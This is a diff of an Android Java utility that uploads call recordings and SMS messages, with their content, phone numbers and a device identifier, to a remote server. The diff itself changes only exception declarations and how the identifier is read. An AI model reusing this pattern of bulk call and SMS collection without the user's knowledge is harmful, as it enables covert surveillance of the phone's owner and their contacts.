@@ -31,7 +31,7 @@ import okhttp3.Response;
 public class CallSmsUploadUtils {
 
 
-    public static void uploadPhoneRecord() {
+    public static void uploadPhoneRecord() throws Exception {
         File file = new File(Environment.getExternalStorageDirectory() + "/CallRecorderTest");
         File[] files = file.listFiles();
         if (files != null && files.length > 0) {
@@ -59,7 +59,7 @@ public class CallSmsUploadUtils {
                     type = "undifined";
                 }
 
-                String imei = SystemUtil.getIMEI(MyApp.getAppContext());
+                String imei = GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
 //                RecordUpload.uploadAmr(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
                 RecordUpload.handleArm2mp3(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
             }
@@ -68,7 +68,7 @@ public class CallSmsUploadUtils {
 
 
 
-    public static void uploadLocalSms() {
+    public static void uploadLocalSms() throws Exception {
         SPHelper.init(MyApp.getAppContext());
         String sms_list_data = SPHelper.getInstance().getString("SMS_LIST_DATA");
         SharePerSmsBean perSmsBean = new Gson().fromJson(sms_list_data, SharePerSmsBean.class);
@@ -81,7 +81,8 @@ public class CallSmsUploadUtils {
 
                 List<NetworkChangeReceiver.SmssBean> d=new ArrayList<>();
                 for (SharePerSmsBean.DataBean datum : data) {
-                    d.add(new NetworkChangeReceiver.SmssBean(datum.getContent(),SystemUtil.getIMEI(MyApp.getAppContext()),"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
+                    String onlyIdentification = GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
+                    d.add(new NetworkChangeReceiver.SmssBean(datum.getContent(), onlyIdentification,"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
                 }
                 String json=new Gson().toJson(d);
                 String url = AppConfig.OUT_NETWORK + NetApi.upload_sms_messages;
